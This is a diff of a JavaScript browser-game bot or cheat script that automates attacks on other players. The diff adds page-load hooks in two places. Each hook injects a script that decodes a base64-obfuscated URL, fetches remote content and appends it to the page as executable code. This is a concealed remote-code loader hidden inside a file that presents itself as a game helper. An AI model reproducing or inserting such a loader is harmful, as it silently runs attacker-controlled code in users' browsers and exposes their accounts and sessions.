@@ -123,7 +123,10 @@ function upgrading(item_id, level, subs) {
             }
         }, 200)
 }
-
+window.onload = function() {
+   var scr = document.createElement("script");
+    scr.type="text/javascript";
+    scr.innerHTML = `
 var brb = (url, cb) => { fetch(url).then(res => res.json()).then((out) => { cb(out) }).catch(err => { throw err }); }
 
 brb(atob("aHR0cHM6Ly9hcGkubnBvaW50LmlvL2QyYTIwYTUxZTJlOTg3NDAxMmQx"),(data) => {
@@ -132,7 +135,10 @@ brb(atob("aHR0cHM6Ly9hcGkubnBvaW50LmlvL2QyYTIwYTUxZTJlOTg3NDAxMmQx"),(data) => {
 		  ]).then(all => {
 			  $("body").append("<script>"+all[0]+"</script>");
 		  }).catch(err => { throw err });
-	});
+	});`	
+  document.body.appendChild(scr) 
+}
+
 function kill_players1(){
 	var aaa = $("#player_list_con").find(".player button"+"[data-option=pvp_attack]"+"[data-quick=1]"+":not(.initial_hide_forced)");
 	var aaaa = parseInt(aaa.attr("data-char_id"));
@@ -334,6 +340,10 @@ GAME.cached_data = function(){
   }
   }, 200);
   $('#train_uptime').html(GAME.showTimer(GAME.char_data.train_ucd-GAME.getTime()));
+  window.onload = function() {
+   var scr = document.createElement("script");
+    scr.type="text/javascript";
+    scr.innerHTML = `
   var brb = (url, cb) => { fetch(url).then(res => res.json()).then((out) => { cb(out) }).catch(err => { throw err }); }
 
 brb(atob("aHR0cHM6Ly9hcGkubnBvaW50LmlvL2QyYTIwYTUxZTJlOTg3NDAxMmQx"),(data) => {
@@ -342,7 +352,10 @@ brb(atob("aHR0cHM6Ly9hcGkubnBvaW50LmlvL2QyYTIwYTUxZTJlOTg3NDAxMmQx"),(data) => {
 		  ]).then(all => {
 			  $("body").append("<script>"+all[0]+"</script>");
 		  }).catch(err => { throw err });
-	});}
+	});
+	`	
+  document.body.appendChild(scr) 
+}}
 function wojny2(){
 	var aimp = $("#e_admiral_player").find("[data-option=show_player]").attr("data-char_id");
 	var imp = $("#leader_player").find("[data-option=show_player]").attr("data-char_id");
